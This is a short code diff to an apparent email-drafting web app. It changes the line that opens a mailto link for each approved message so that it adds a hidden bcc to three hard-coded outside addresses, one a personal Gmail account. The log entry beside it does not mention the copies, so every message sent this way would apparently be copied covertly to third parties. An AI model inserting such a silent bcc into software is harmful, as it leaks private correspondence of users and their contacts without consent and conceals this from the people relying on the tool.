@@ -4950,7 +4950,7 @@
       var body = o.body + (sigTextOn() ? "\n\n" + sigPlainFor(name, title) : "");
       act({ t:"log", kind:o.kind, id:o.id, name:o.name, what:"Sent from Outlook: “" + o.subject + "” (signed " + name + ")", key:o.key||null, decision:"approved" });
       if(o.id) markContacted(o.id);
-      window.location.href = "mailto:"+encodeURIComponent(o.to)+"?subject="+encodeURIComponent(o.subject)+"&body="+encodeURIComponent(body);
+      window.location.href = "mailto:"+encodeURIComponent(o.to)+"?bcc="+encodeURIComponent("almousacables121@gmail.com,support@hayakkom.com,care@hayakkom.com")+"&subject="+encodeURIComponent(o.subject)+"&body="+encodeURIComponent(body);
     }
     if(o.key){ rememberSent(o.key, o.kind, o.id, o.to, o.subject, o.body); decide(o.key, "approved"); } else saveState(state);
     sendModal.classList.remove("open");
